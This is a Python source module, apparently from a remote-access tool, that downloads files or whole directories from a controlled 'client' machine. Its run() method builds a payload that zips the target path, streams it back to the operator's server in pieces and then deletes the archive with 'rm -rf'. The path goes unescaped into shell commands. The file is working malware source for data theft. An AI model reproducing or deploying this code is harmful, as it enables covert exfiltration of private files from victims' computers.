from modules.helpers import ModuleABC
import os
from Cryptodome.Hash import MD5


class Module(ModuleABC):
    def __init__(self):
        self.download_file = None
        self.output_folder = None
        self.buffer_size = None

    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Download a file or directory from the client.",
            "References": [],
            "Task": True
        }

    def setup(self, module_input, view, successful):
        self.download_file = module_input.prompt("Path to file or directory on client machine: ")
        self.output_folder = os.path.expanduser(module_input.prompt("Local output folder (ENTER for output/): "))
        self.buffer_size = module_input.prompt("Buffer size (ENTER for 4096 bytes): ")

        # Set default variables.
        if not self.buffer_size:
            self.buffer_size = 4096
        if type(self.buffer_size) is not int:
            view.output("Invalid buffer size, using 4096.", "info")
            self.buffer_size = 4096
        if not self.output_folder:
            self.output_folder = "output"

            if not os.path.exists("output"):
                os.mkdir("output")

        if os.path.exists(os.path.join(self.output_folder, os.path.basename(self.download_file))):
            view.output("A file with that name already exists!", "attention")
            successful.put(False)
        elif not os.path.exists(self.output_folder):
            view.output("Output folder doesn't exist!", "attention")
            successful.put(False)
        else:
            successful.put(True)

    def run(self):
        return """\
        import uuid
        
        download_file = os.path.expanduser("%s")

                
        def get_file_hash(file_path):
            \"\"\":return The MD5 hash of the specified file path.\"\"\"
            return run_command("md5 " + os.path.realpath(file_path)).split(" = ")[1]
            
        
        def upload_file(file_path):
            \"\"\"Send back the file in pieces to the server (so we support very large files).\"\"\"
            with open(file_path, "rb") as input_file:
                while True:
                    try:
                        piece = input_file.read(%s)
                        
                        if not piece:
                            break
                        send_response(piece, "download")
                    except SystemExit:
                        # Thrown when "kill download" is run.
                        send_response("Stopped uploading.", "download")
                        break
        
        
        if not os.path.exists(download_file):
            send_response("Failed to download, invalid path.", "download")
        else:
            if os.path.isdir(download_file):
                send_response("Compressing directory: " + download_file, "download")
                zip_file = os.path.join("/tmp", str(uuid.uuid4()).replace("-", "")[:12] + ".zip")
                
                run_command("zip -r " + zip_file + " " + download_file, False, False)
                
                send_response("Started:Directory:" + get_file_hash(zip_file), "download")
                upload_file(zip_file)
                
                send_response("Finished.", "download")
                run_command("rm -rf " + zip_file)
            else:
                send_response("Started:File:" + get_file_hash(download_file), "download")
                upload_file(download_file)
                
                send_response("Finished.", "download")
        """ % (self.download_file, self.buffer_size)

    def process_response(self, response: bytes, view):
        # Files are sent back to us in small pieces (encoded with Base64),
        # we simply decode these pieces and write them to the output file.
        output_name = os.path.basename(self.download_file)
        output_file = os.path.join(self.output_folder, output_name)

        try:
            str_response = response.decode()
        except UnicodeDecodeError:
            # Not a string, thanks python3...
            str_response = ""

        if "Failed to download" in str_response:
            view.output(str_response, "attention")
        elif "Compressing directory" in str_response:
            view.output(str_response, "info")
        elif "Stopped" in str_response:
            view.output(str_response, "info")
        elif "Started" in str_response:
            file_type = str_response.split(":")[1].lower()
            md5_hash = str_response.split(":")[2]

            if file_type == "directory":
                # Updates the output name for the next request.
                self.download_file = self.download_file + ".zip"

            view.output("Started downloading: \"{}\"...".format(output_name))
            view.output("Remote MD5 file hash: {}".format(md5_hash))
        elif "Finished" in str_response:
            view.output("Local MD5 file hash (should match): {}".format(self._get_file_hash(output_file)))
            view.output("Finished file download, saved to: {}".format(output_file))
        else:
            with open(output_file, "ab") as output_file:
                output_file.write(response)

    @staticmethod
    def _get_file_hash(file_path):
        result = MD5.new()

        with open(file_path, "rb") as input_file:
            while True:
                data = input_file.read(4096)

                if not data:
                    break
                result.update(data)
        return result.hexdigest()
